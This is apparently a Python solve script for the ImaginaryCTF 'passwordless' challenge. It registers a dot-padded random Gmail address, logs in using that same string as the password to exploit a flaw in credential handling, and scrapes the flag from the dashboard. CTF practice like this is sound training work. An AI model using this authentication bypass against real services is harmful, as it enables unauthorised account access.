import requests
import re
import random
import string

session = requests.Session()
payload = f"{".".join(random.choices(string.ascii_letters, k=32))}@gmail.com"
base_url = "http://passwordless.chal.imaginaryctf.org"

def create_account():
    resp = session.post(f"{base_url}/user", data={"email": payload})
    print("Account created successfully.")

def login_account():
    resp = session.post(f"{base_url}/session", data={"email": payload, "password": payload})
    print("Account logged in successfully.")

def get_flag():
    resp = session.get(f"{base_url}/dashboard")
    match = re.search(r'id="flag">(.*?)</span>', resp.text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def main():
    create_account()
    login_account()
    flag = get_flag()
    if flag:
        print(flag)
    else:
        print("Flag not found.")

main()